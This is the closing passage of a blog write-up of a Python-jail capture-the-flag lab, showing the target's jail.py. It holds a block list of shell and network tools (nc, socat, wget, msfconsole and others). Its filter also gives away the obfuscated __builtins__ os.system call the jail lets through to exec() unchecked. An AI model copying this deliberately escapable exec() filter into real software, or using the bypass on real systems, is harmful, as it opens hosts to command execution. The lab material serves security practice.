class=s1>&#39;dstat&#39;</span><span class=p>,</span> <span class=s1>&#39;dvips&#39;</span><span class=p>,</span> <span class=s1>&#39;easy_install&#39;</span><span class=p>,</span> <span class=s1>&#39;eb&#39;</span><span class=p>,</span> <span class=s1>&#39;ed&#39;</span><span class=p>,</span> <span class=s1>&#39;efax&#39;</span><span class=p>,</span> <span class=s1>&#39;elvish&#39;</span><span class=p>,</span> <span class=s1>&#39;emacs&#39;</span><span class=p>,</span> <span class=s1>&#39;env&#39;</span><span class=p>,</span> <span class=s1>&#39;eqn&#39;</span><span class=p>,</span> <span class=s1>&#39;espeak&#39;</span><span class=p>,</span> <span class=s1>&#39;exiftool&#39;</span><span class=p>,</span> <span class=s1>&#39;expand&#39;</span><span class=p>,</span> <span class=s1>&#39;expect&#39;</span><span class=p>,</span> <span class=s1>&#39;facter&#39;</span><span class=p>,</span> <span class=s1>&#39;find&#39;</span><span class=p>,</span> <span class=s1>&#39;finger&#39;</span><span class=p>,</span> <span class=s1>&#39;fish&#39;</span><span class=p>,</span> <span class=s1>&#39;flock&#39;</span><span class=p>,</span> <span class=s1>&#39;fmt&#39;</span><span class=p>,</span> <span class=s1>&#39;fping&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp&#39;</span><span class=p>,</span> <span class=s1>&#39;gawk&#39;</span><span class=p>,</span> <span class=s1>&#39;gcc&#39;</span><span class=p>,</span> <span class=s1>&#39;gcloud&#39;</span><span class=p>,</span> <span class=s1>&#39;gcore&#39;</span><span class=p>,</span> <span class=s1>&#39;gdb&#39;</span><span class=p>,</span> <span class=s1>&#39;gem&#39;</span><span class=p>,</span> <span class=s1>&#39;genie&#39;</span><span class=p>,</span> <span class=s1>&#39;genisoimage&#39;</span><span class=p>,</span> <span class=s1>&#39;ghc&#39;</span><span class=p>,</span> <span class=s1>&#39;ghci&#39;</span><span class=p>,</span> <span class=s1>&#39;gimp&#39;</span><span class=p>,</span> <span class=s1>&#39;ginsh&#39;</span><span class=p>,</span> <span class=s1>&#39;git&#39;</span><span class=p>,</span> <span class=s1>&#39;grc&#39;</span><span class=p>,</span> <span class=s1>&#39;grep&#39;</span><span class=p>,</span> <span class=s1>&#39;gtester&#39;</span><span class=p>,</span> <span class=s1>&#39;gzip&#39;</span><span class=p>,</span> <span class=s1>&#39;hd&#39;</span><span class=p>,</span> <span class=s1>&#39;head&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdump&#39;</span><span class=p>,</span> <span class=s1>&#39;highlight&#39;</span><span class=p>,</span> <span class=s1>&#39;hping3&#39;</span><span class=p>,</span> <span class=s1>&#39;iconv&#39;</span><span class=p>,</span> <span class=s1>&#39;iftop&#39;</span><span class=p>,</span> <span class=s1>&#39;install&#39;</span><span class=p>,</span> <span class=s1>&#39;ionice&#39;</span><span class=p>,</span> <span class=s1>&#39;ip&#39;</span><span class=p>,</span> <span class=s1>&#39;irb&#39;</span><span class=p>,</span> <span class=s1>&#39;ispell&#39;</span><span class=p>,</span> <span class=s1>&#39;jjs&#39;</span><span class=p>,</span> <span class=s1>&#39;joe&#39;</span><span class=p>,</span> <span class=s1>&#39;join&#39;</span><span class=p>,</span> <span class=s1>&#39;journalctl&#39;</span><span class=p>,</span> <span class=s1>&#39;jq&#39;</span><span class=p>,</span> <span class=s1>&#39;jrunscript&#39;</span><span class=p>,</span> <span class=s1>&#39;jtag&#39;</span><span class=p>,</span> <span class=s1>&#39;julia&#39;</span><span class=p>,</span> <span class=s1>&#39;knife&#39;</span><span class=p>,</span> <span class=s1>&#39;ksh&#39;</span><span class=p>,</span> <span class=s1>&#39;ksshell&#39;</span><span class=p>,</span> <span class=s1>&#39;ksu&#39;</span><span class=p>,</span> <span class=s1>&#39;kubectl&#39;</span><span class=p>,</span> <span class=s1>&#39;latex&#39;</span><span class=p>,</span> <span class=s1>&#39;latexmk&#39;</span><span class=p>,</span><span class=s1>&#39;ld.so&#39;</span><span class=p>,</span> <span class=s1>&#39;ldconfig&#39;</span><span class=p>,</span> <span class=s1>&#39;less&#39;</span><span class=p>,</span> <span class=s1>&#39;lftp&#39;</span><span class=p>,</span> <span class=s1>&#39;ln&#39;</span><span class=p>,</span> <span class=s1>&#39;loginctl&#39;</span><span class=p>,</span> <span class=s1>&#39;logsave&#39;</span><span class=p>,</span> <span class=s1>&#39;look&#39;</span><span class=p>,</span> <span class=s1>&#39;lp&#39;</span><span class=p>,</span> <span class=s1>&#39;ltrace&#39;</span><span class=p>,</span> <span class=s1>&#39;lua&#39;</span><span class=p>,</span> <span class=s1>&#39;lualatex&#39;</span><span class=p>,</span> <span class=s1>&#39;luatex&#39;</span><span class=p>,</span> <span class=s1>&#39;lwp-&#39;</span><span class=p>,</span> <span class=s1>&#39;lwp-request&#39;</span><span class=p>,</span> <span class=s1>&#39;mail&#39;</span><span class=p>,</span> <span class=s1>&#39;make&#39;</span><span class=p>,</span> <span class=s1>&#39;man&#39;</span><span class=p>,</span> <span class=s1>&#39;mawk&#39;</span><span class=p>,</span> <span class=s1>&#39;more&#39;</span><span class=p>,</span> <span class=s1>&#39;mosquitto&#39;</span><span class=p>,</span> <span class=s1>&#39;mount&#39;</span><span class=p>,</span> <span class=s1>&#39;msfconsole&#39;</span><span class=p>,</span> <span class=s1>&#39;msgattrib&#39;</span><span class=p>,</span> <span class=s1>&#39;msgcat&#39;</span><span class=p>,</span> <span class=s1>&#39;msgconv&#39;</span><span class=p>,</span> <span class=s1>&#39;msgfilter&#39;</span><span class=p>,</span> <span class=s1>&#39;msgmerge&#39;</span><span class=p>,</span> <span class=s1>&#39;msguniq&#39;</span><span class=p>,</span> <span class=s1>&#39;mtr&#39;</span><span class=p>,</span> <span class=s1>&#39;multitime&#39;</span><span class=p>,</span> <span class=s1>&#39;mv&#39;</span><span class=p>,</span> <span class=s1>&#39;mysql&#39;</span><span class=p>,</span> <span class=s1>&#39;nano&#39;</span><span class=p>,</span> <span class=s1>&#39;nasm&#39;</span><span class=p>,</span> <span class=s1>&#39;nawk&#39;</span><span class=p>,</span> <span class=s1>&#39;nc&#39;</span><span class=p>,</span> <span class=s1>&#39;ncftp&#39;</span><span class=p>,</span> <span class=s1>&#39;neofetch&#39;</span><span class=p>,</span> <span class=s1>&#39;nft&#39;</span><span class=p>,</span> <span class=s1>&#39;nice&#39;</span><span class=p>,</span> <span class=s1>&#39;nl&#39;</span><span class=p>,</span> <span class=s1>&#39;nm&#39;</span><span class=p>,</span> <span class=s1>&#39;nmap&#39;</span><span class=p>,</span> <span class=s1>&#39;node&#39;</span><span class=p>,</span> <span class=s1>&#39;nohup&#39;</span><span class=p>,</span> <span class=s1>&#39;npm&#39;</span><span class=p>,</span> <span class=s1>&#39;nroff&#39;</span><span class=p>,</span> <span class=s1>&#39;nsenter&#39;</span><span class=p>,</span> <span class=s1>&#39;octave&#39;</span><span class=p>,</span> <span class=s1>&#39;od&#39;</span><span class=p>,</span> <span class=s1>&#39;openssl&#39;</span><span class=p>,</span> <span class=s1>&#39;openvpn&#39;</span><span class=p>,</span> <span class=s1>&#39;openvt&#39;</span><span class=p>,</span> <span class=s1>&#39;opkg&#39;</span><span class=p>,</span> <span class=s1>&#39;pandoc&#39;</span><span class=p>,</span> <span class=s1>&#39;paste&#39;</span><span class=p>,</span> <span class=s1>&#39;pax&#39;</span><span class=p>,</span> <span class=s1>&#39;pdb&#39;</span><span class=p>,</span> <span class=s1>&#39;pdflatex&#39;</span><span class=p>,</span> <span class=s1>&#39;pdftex&#39;</span><span class=p>,</span> <span class=s1>&#39;perf&#39;</span><span class=p>,</span> <span class=s1>&#39;perl&#39;</span><span class=p>,</span> <span class=s1>&#39;perlbug&#39;</span><span class=p>,</span> <span class=s1>&#39;pexec&#39;</span><span class=p>,</span> <span class=s1>&#39;pg&#39;</span><span class=p>,</span> <span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;pic&#39;</span><span class=p>,</span> <span class=s1>&#39;pico&#39;</span><span class=p>,</span> <span class=s1>&#39;pidstat&#39;</span><span class=p>,</span> <span class=s1>&#39;pip&#39;</span><span class=p>,</span> <span class=s1>&#39;pkexec&#39;</span><span class=p>,</span> <span class=s1>&#39;pkg&#39;</span><span class=p>,</span> <span class=s1>&#39;posh&#39;</span><span class=p>,</span><span class=s1>&#39;pry&#39;</span><span class=p>,</span> <span class=s1>&#39;psftp&#39;</span><span class=p>,</span> <span class=s1>&#39;psql&#39;</span><span class=p>,</span> <span class=s1>&#39;ptx&#39;</span><span class=p>,</span> <span class=s1>&#39;puppet&#39;</span><span class=p>,</span> <span class=s1>&#39;pwsh&#39;</span><span class=p>,</span> <span class=s1>&#39;python&#39;</span><span class=p>,</span> <span class=s1>&#39;rake&#39;</span><span class=p>,</span> <span class=s1>&#39;rc&#39;</span><span class=p>,</span> <span class=s1>&#39;readelf&#39;</span><span class=p>,</span> <span class=s1>&#39;red&#39;</span><span class=p>,</span> <span class=s1>&#39;redcarpet&#39;</span><span class=p>,</span> <span class=s1>&#39;redis&#39;</span><span class=p>,</span> <span class=s1>&#39;restic&#39;</span><span class=p>,</span> <span class=s1>&#39;rev&#39;</span><span class=p>,</span> <span class=s1>&#39;rlogin&#39;</span><span class=p>,</span> <span class=s1>&#39;rlwrap&#39;</span><span class=p>,</span> <span class=s1>&#39;rpm&#39;</span><span class=p>,</span> <span class=s1>&#39;rpmdb&#39;</span><span class=p>,</span> <span class=s1>&#39;rpmquery&#39;</span><span class=p>,</span> <span class=s1>&#39;rpmverify&#39;</span><span class=p>,</span> <span class=s1>&#39;rsync&#39;</span><span class=p>,</span> <span class=s1>&#39;rtorrent&#39;</span><span class=p>,</span> <span class=s1>&#39;ruby&#39;</span><span class=p>,</span> <span class=s1>&#39;run-mailcap&#39;</span><span class=p>,</span> <span class=s1>&#39;run-parts&#39;</span><span class=p>,</span> <span class=s1>&#39;rview&#39;</span><span class=p>,</span> <span class=s1>&#39;rvim&#39;</span><span class=p>,</span> <span class=s1>&#39;sash&#39;</span><span class=p>,</span> <span class=s1>&#39;scanmem&#39;</span><span class=p>,</span> <span class=s1>&#39;scp&#39;</span><span class=p>,</span> <span class=s1>&#39;screen&#39;</span><span class=p>,</span> <span class=s1>&#39;script&#39;</span><span class=p>,</span> <span class=s1>&#39;scrot&#39;</span><span class=p>,</span> <span class=s1>&#39;sed&#39;</span><span class=p>,</span> <span class=s1>&#39;service&#39;</span><span class=p>,</span> <span class=s1>&#39;setarch&#39;</span><span class=p>,</span> <span class=s1>&#39;setfacl&#39;</span><span class=p>,</span> <span class=s1>&#39;setlock&#39;</span><span class=p>,</span> <span class=s1>&#39;sftp&#39;</span><span class=p>,</span> <span class=s1>&#39;sg&#39;</span><span class=p>,</span> <span class=s1>&#39;shuf&#39;</span><span class=p>,</span> <span class=s1>&#39;slsh&#39;</span><span class=p>,</span> <span class=s1>&#39;smbclient&#39;</span><span class=p>,</span> <span class=s1>&#39;snap&#39;</span><span class=p>,</span> <span class=s1>&#39;socat&#39;</span><span class=p>,</span> <span class=s1>&#39;socket&#39;</span><span class=p>,</span> <span class=s1>&#39;soelim&#39;</span><span class=p>,</span> <span class=s1>&#39;softlimit&#39;</span><span class=p>,</span> <span class=s1>&#39;sort&#39;</span><span class=p>,</span> <span class=s1>&#39;split&#39;</span><span class=p>,</span> <span class=s1>&#39;sqlite3&#39;</span><span class=p>,</span> <span class=s1>&#39;sqlmap&#39;</span><span class=p>,</span> <span class=s1>&#39;ss&#39;</span><span class=p>,</span> <span class=s1>&#39;ssh-agent&#39;</span><span class=p>,</span> <span class=s1>&#39;ssh-keygen&#39;</span><span class=p>,</span> <span class=s1>&#39;ssh-keyscan&#39;</span><span class=p>,</span> <span class=s1>&#39;ssh&#39;</span><span class=p>,</span> <span class=s1>&#39;sshpass&#39;</span><span class=p>,</span> <span class=s1>&#39;start-stop-daemon&#39;</span><span class=p>,</span> <span class=s1>&#39;stdbuf&#39;</span><span class=p>,</span> <span class=s1>&#39;strace&#39;</span><span class=p>,</span> <span class=s1>&#39;strings&#39;</span><span class=p>,</span> <span class=s1>&#39;su&#39;</span><span class=p>,</span> <span class=s1>&#39;sysctl&#39;</span><span class=p>,</span> <span class=s1>&#39;systemctl&#39;</span><span class=p>,</span> <span class=s1>&#39;systemd-resolve&#39;</span><span class=p>,</span> <span class=s1>&#39;tac&#39;</span><span class=p>,</span> <span class=s1>&#39;tail&#39;</span><span class=p>,</span> <span class=s1>&#39;tar&#39;</span><span class=p>,</span> <span class=s1>&#39;task&#39;</span><span class=p>,</span> <span class=s1>&#39;taskset&#39;</span><span class=p>,</span> <span class=s1>&#39;tasksh&#39;</span><span class=p>,</span> <span class=s1>&#39;tbl&#39;</span><span class=p>,</span> <span class=s1>&#39;tclsh&#39;</span><span class=p>,</span> <span class=s1>&#39;tcpdump&#39;</span><span class=p>,</span> <span class=s1>&#39;tdbtool&#39;</span><span class=p>,</span> <span class=s1>&#39;tee&#39;</span><span class=p>,</span> <span class=s1>&#39;telnet&#39;</span><span class=p>,</span> <span class=s1>&#39;tex&#39;</span><span class=p>,</span> <span class=s1>&#39;tftp&#39;</span><span class=p>,</span> <span class=s1>&#39;tic&#39;</span><span class=p>,</span> <span class=s1>&#39;time&#39;</span><span class=p>,</span> <span class=s1>&#39;timedatectl&#39;</span><span class=p>,</span> <span class=s1>&#39;timeout&#39;</span><span class=p>,</span> <span class=s1>&#39;tmate&#39;</span><span class=p>,</span> <span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;top&#39;</span><span class=p>,</span> <span class=s1>&#39;torify&#39;</span><span class=p>,</span> <span class=s1>&#39;torsocks&#39;</span><span class=p>,</span> <span class=s1>&#39;troff&#39;</span><span class=p>,</span> <span class=s1>&#39;tshark&#39;</span><span class=p>,</span> <span class=s1>&#39;ul&#39;</span><span class=p>,</span> <span class=s1>&#39;unexpand&#39;</span><span class=p>,</span> <span class=s1>&#39;uniq&#39;</span><span class=p>,</span> <span class=s1>&#39;unshare&#39;</span><span class=p>,</span> <span class=s1>&#39;unzip&#39;</span><span class=p>,</span> <span class=s1>&#39;update-alternatives&#39;</span><span class=p>,</span> <span class=s1>&#39;uudecode&#39;</span><span class=p>,</span> <span class=s1>&#39;uuencode&#39;</span><span class=p>,</span> <span class=s1>&#39;vagrant&#39;</span><span class=p>,</span> <span class=s1>&#39;valgrind&#39;</span><span class=p>,</span> <span class=s1>&#39;vi&#39;</span><span class=p>,</span> <span class=s1>&#39;view&#39;</span><span class=p>,</span> <span class=s1>&#39;vigr&#39;</span><span class=p>,</span> <span class=s1>&#39;vim&#39;</span><span class=p>,</span> <span class=s1>&#39;vimdiff&#39;</span><span class=p>,</span> <span class=s1>&#39;vipw&#39;</span><span class=p>,</span> <span class=s1>&#39;virsh&#39;</span><span class=p>,</span> <span class=s1>&#39;volatility&#39;</span><span class=p>,</span> <span class=s1>&#39;w3m&#39;</span><span class=p>,</span> <span class=s1>&#39;wall&#39;</span><span class=p>,</span> <span class=s1>&#39;watch&#39;</span><span class=p>,</span> <span class=s1>&#39;wc&#39;</span><span class=p>,</span> <span class=s1>&#39;wget&#39;</span><span class=p>,</span> <span class=s1>&#39;whiptail&#39;</span><span class=p>,</span> <span class=s1>&#39;whois&#39;</span><span class=p>,</span> <span class=s1>&#39;wireshark&#39;</span><span class=p>,</span> <span class=s1>&#39;wish&#39;</span><span class=p>,</span> <span class=s1>&#39;xargs&#39;</span><span class=p>,</span> <span class=s1>&#39;xdotool&#39;</span><span class=p>,</span> <span class=s1>&#39;xelatex&#39;</span><span class=p>,</span> <span class=s1>&#39;xetex&#39;</span><span class=p>,</span> <span class=s1>&#39;xmodmap&#39;</span><span class=p>,</span> <span class=s1>&#39;xmore&#39;</span><span class=p>,</span> <span class=s1>&#39;xpad&#39;</span><span class=p>,</span> <span class=s1>&#39;xxd&#39;</span><span class=p>,</span> <span class=s1>&#39;xz&#39;</span><span class=p>,</span> <span class=s1>&#39;yarn&#39;</span><span class=p>,</span> <span class=s1>&#39;yash&#39;</span><span class=p>,</span> <span class=s1>&#39;yelp&#39;</span><span class=p>,</span> <span class=s1>&#39;yum&#39;</span><span class=p>,</span> <span class=s1>&#39;zathura&#39;</span><span class=p>,</span> <span class=s1>&#39;zip&#39;</span><span class=p>,</span> <span class=s1>&#39;zsh&#39;</span><span class=p>,</span> <span class=s1>&#39;zsoelim&#39;</span><span class=p>,</span> <span class=s1>&#39;zypper&#39;</span><span class=p>,</span><span class=s1>&#39;&amp;&#39;</span><span class=p>,</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=s1>&#39;$&#39;</span><span class=p>,</span><span class=s1>&#39;{&#39;</span><span class=p>,</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;&lt;&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>keyword</span> <span class=ow>in</span> <span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>malicious</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;__builtins__.__dict__[&#39;__IMPORT__&#39;.casefold()](&#39;OS&#39;.casefold()).__dict__[&#39;SYSTEM&#39;.casefold()](&#39;&#34;</span> <span class=ow>in</span> <span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>text</span><span class=p>)</span><span class=o>!=</span><span class=mi>119</span> <span class=ow>or</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>islink</span><span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=mi>95</span><span class=p>:</span><span class=o>-</span><span class=mi>2</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                            <span class=n>malicious</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                            <span class=k>return</span>
</span></span><span class=line><span class=cl>                        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span><span class=p>(</span><span class=n>text</span><span class=p>[</span><span class=mi>95</span><span class=p>:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span><span class=o>!=</span><span class=s2>&#34;/lib/yorick/bin/yorick&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                                <span class=n>malicious</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                                <span class=k>return</span>
</span></span><span class=line><span class=cl>                            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                                <span class=n>exec</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>exec</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>except</span> <span class=ne>SyntaxError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Wrong Input&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>except</span> <span class=ne>NameError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Wrong Input&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  Welcome to Python jail  &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  Will you stay locked forever  &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  Or will you BreakMe  &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>The above code is the actual content of <code>jail.py</code> in the target system.</p><p>We solved the lab.</p><p>Happy Hacking !!! &#x1f60e;</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>